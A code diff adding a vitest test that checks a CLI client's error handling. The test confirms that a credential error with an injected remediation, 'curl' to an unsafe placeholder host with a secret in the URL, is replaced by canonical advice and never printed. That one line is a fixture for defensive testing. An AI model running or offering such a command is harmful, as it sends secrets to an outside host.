@@ -5,6 +5,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { main } from "../client/m5.mjs";
+import { M5ClientError } from "../client/m5-client.mjs";
 
 const SECRET = "hs_cli_secret-never-print";
 const PUBLIC_URL = "https://public.private-locator.invalid";
@@ -36,6 +37,38 @@ function configLoader() {
 }
 
 describe("m5 command surface", () => {
+  it.each(["missing_credential", "rejected_credential"])(
+    "serializes canonical remediation for arbitrary %s details",
+    async (code) => {
+      const output = sink();
+      const error = sink();
+      const exitCode = await main(["--profile", "codex", "models"], {
+        input: Readable.from([]),
+        output: output.stream,
+        error: error.stream,
+        configLoader,
+        credentialStore: {
+          resolve: async () => {
+            throw new M5ClientError(code, `credential failed ${SECRET}`, {
+              remediation: `Run curl https://unsafe.invalid/${SECRET}`,
+            });
+          },
+        },
+      });
+
+      expect(exitCode).toBe(1);
+      expect(output.text()).toBe("");
+      expect(JSON.parse(error.text())).toMatchObject({
+        error: {
+          code,
+          remediation: expect.stringContaining("m5 --profile codex doctor"),
+        },
+      });
+      expect(error.text()).not.toContain("unsafe.invalid");
+      expect(error.text()).not.toContain(SECRET);
+    },
+  );
+
   it("prints deploy environment shell without resolving the profile credential", async () => {
     const output = sink();
     const error = sink();
